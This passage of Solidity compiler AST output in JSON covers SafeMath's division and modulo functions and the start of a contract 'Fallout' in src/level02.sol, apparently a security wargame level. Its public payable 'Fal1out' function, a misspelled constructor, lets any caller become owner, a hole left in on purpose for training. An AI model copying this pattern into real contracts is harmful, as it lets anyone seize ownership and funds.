																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															}
														],
														"id": 112,
														"name": "div",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															119,
															146
														],
														"referencedDeclaration": 146,
														"src": "3150:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$_t_string_memory_ptr_$returns$_t_uint256_$",
															"typeString": "function (uint256,uint256,string memory) pure returns (uint256)"
														}
													},
													"id": 116,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3150:39:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 111,
												"id": 117,
												"nodeType": "Return",
												"src": "3143:46:0"
											}
										]
									},
									"documentation": "@dev Returns the integer division of two unsigned integers. Reverts on\ndivision by zero. The result is rounded towards zero.\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n`revert` opcode (which leaves remaining gas untouched) while Solidity\nuses an invalid opcode to revert (consuming all remaining gas).\n     * Requirements:\n- The divisor cannot be zero.",
									"id": 119,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 108,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 105,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 119,
												"src": "3079:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 104,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3079:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 107,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 119,
												"src": "3090:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 106,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3090:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3078:22:0"
									},
									"returnParameters": {
										"id": 111,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 110,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 119,
												"src": "3124:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 109,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3124:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3123:9:0"
									},
									"scope": 186,
									"src": "3066:130:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 145,
										"nodeType": "Block",
										"src": "3766:243:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 133,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 131,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 123,
																"src": "3850:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 132,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3854:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "3850:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 134,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 125,
															"src": "3857:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 130,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															339,
															340
														],
														"referencedDeclaration": 340,
														"src": "3842:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 135,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3842:28:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 136,
												"nodeType": "ExpressionStatement",
												"src": "3842:28:0"
											},
											{
												"assignments": [
													138
												],
												"declarations": [
													{
														"constant": false,
														"id": 138,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 145,
														"src": "3880:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 137,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "3880:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 142,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 141,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 139,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 121,
														"src": "3892:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 140,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 123,
														"src": "3896:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3892:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3880:17:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 143,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 138,
													"src": "4001:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 129,
												"id": 144,
												"nodeType": "Return",
												"src": "3994:8:0"
											}
										]
									},
									"documentation": "@dev Returns the integer division of two unsigned integers. Reverts with custom message on\ndivision by zero. The result is rounded towards zero.\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n`revert` opcode (which leaves remaining gas untouched) while Solidity\nuses an invalid opcode to revert (consuming all remaining gas).\n     * Requirements:\n- The divisor cannot be zero.",
									"id": 146,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 126,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 121,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 146,
												"src": "3684:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 120,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3684:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 123,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 146,
												"src": "3695:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 122,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3695:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 125,
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 146,
												"src": "3706:26:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 124,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "3706:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3683:50:0"
									},
									"returnParameters": {
										"id": 129,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 128,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 146,
												"src": "3757:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 127,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3757:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3756:9:0"
									},
									"scope": 186,
									"src": "3671:338:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 161,
										"nodeType": "Block",
										"src": "4520:61:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 156,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 148,
															"src": "4541:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 157,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 150,
															"src": "4544:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d6f64756c6f206279207a65726f",
															"id": 158,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4547:26:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															},
															"value": "SafeMath: modulo by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															}
														],
														"id": 155,
														"name": "mod",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															162,
															185
														],
														"referencedDeclaration": 185,
														"src": "4537:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$_t_string_memory_ptr_$returns$_t_uint256_$",
															"typeString": "function (uint256,uint256,string memory) pure returns (uint256)"
														}
													},
													"id": 159,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4537:37:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 154,
												"id": 160,
												"nodeType": "Return",
												"src": "4530:44:0"
											}
										]
									},
									"documentation": "@dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\nReverts when dividing by zero.\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\nopcode (which leaves remaining gas untouched) while Solidity uses an\ninvalid opcode to revert (consuming all remaining gas).\n     * Requirements:\n- The divisor cannot be zero.",
									"id": 162,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 151,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 148,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 162,
												"src": "4466:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 147,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4466:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 150,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 162,
												"src": "4477:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 149,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4477:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4465:22:0"
									},
									"returnParameters": {
										"id": 154,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 153,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 162,
												"src": "4511:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 152,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4511:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4510:9:0"
									},
									"scope": 186,
									"src": "4453:128:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 184,
										"nodeType": "Block",
										"src": "5140:68:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 176,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 174,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 166,
																"src": "5158:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 175,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "5163:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "5158:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 177,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 168,
															"src": "5166:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 173,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															339,
															340
														],
														"referencedDeclaration": 340,
														"src": "5150:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 178,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5150:29:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 179,
												"nodeType": "ExpressionStatement",
												"src": "5150:29:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 182,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 180,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 164,
														"src": "5196:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"id": 181,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 166,
														"src": "5200:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5196:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 172,
												"id": 183,
												"nodeType": "Return",
												"src": "5189:12:0"
											}
										]
									},
									"documentation": "@dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\nReverts with custom message when dividing by zero.\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\nopcode (which leaves remaining gas untouched) while Solidity uses an\ninvalid opcode to revert (consuming all remaining gas).\n     * Requirements:\n- The divisor cannot be zero.",
									"id": 185,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 169,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 164,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 185,
												"src": "5058:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 163,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5058:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 166,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 185,
												"src": "5069:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 165,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5069:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 168,
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 185,
												"src": "5080:26:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 167,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5080:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5057:50:0"
									},
									"returnParameters": {
										"id": 172,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 171,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 185,
												"src": "5131:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 170,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5131:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5130:9:0"
									},
									"scope": 186,
									"src": "5045:163:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 187,
							"src": "622:4588:0"
						}
					],
					"src": "33:5178:0"
				},
				"id": 0
			},
			"src/level02.sol": {
				"ast": {
					"absolutePath": "src/level02.sol",
					"exportedSymbols": {
						"Fallout": [
							297
						]
					},
					"id": 298,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 188,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:1"
						},
						{
							"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol",
							"file": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol",
							"id": 189,
							"nodeType": "ImportDirective",
							"scope": 298,
							"sourceUnit": 187,
							"src": "114:112:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 297,
							"linearizedBaseContracts": [
								297
							],
							"name": "Fallout",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 192,
									"libraryName": {
										"contractScope": null,
										"id": 190,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 186,
										"src": "258:8:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$186",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "252:27:1",
									"typeName": {
										"id": 191,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "271:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": false,
									"id": 196,
									"name": "allocations",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 297,
									"src": "282:37:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 195,
										"keyType": {
											"id": 193,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "291:7:1",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "282:25:1",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 194,
											"name": "uint",
											"nodeType": "ElementaryTypeName",
											"src": "302:4:1",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"functionSelector": "8da5cb5b",
									"id": 198,
									"name": "owner",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 297,
									"src": "323:28:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address_payable",
										"typeString": "address payable"
									},
									"typeName": {
										"id": 197,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "323:15:1",
										"stateMutability": "payable",
										"typeDescriptions": {
											"typeIdentifier": "t_address_payable",
											"typeString": "address payable"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 213,
										"nodeType": "Block",
										"src": "411:65:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 204,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 201,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 198,
														"src": "417:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 202,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 336,
															"src": "425:3:1",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 203,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "425:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"src": "417:18:1",
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"id": 205,
												"nodeType": "ExpressionStatement",
												"src": "417:18:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 211,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 206,
															"name": "allocations",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 196,
															"src": "441:11:1",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 208,
														"indexExpression": {
															"argumentTypes": null,
															"id": 207,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 198,
															"src": "453:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "441:18:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 209,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 336,
															"src": "462:3:1",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 210,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "value",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "462:9:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "441:30:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 212,
												"nodeType": "ExpressionStatement",
												"src": "441:30:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "6fab5ddf",
									"id": 214,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "Fal1out",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 199,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "393:2:1"
									},
									"returnParameters": {
										"id": 200,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "411:0:1"
									},
									"scope": 297,
									"src": "377:99:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 225,
										"nodeType": "Block",
										"src": "499:123:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															"id": 220,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
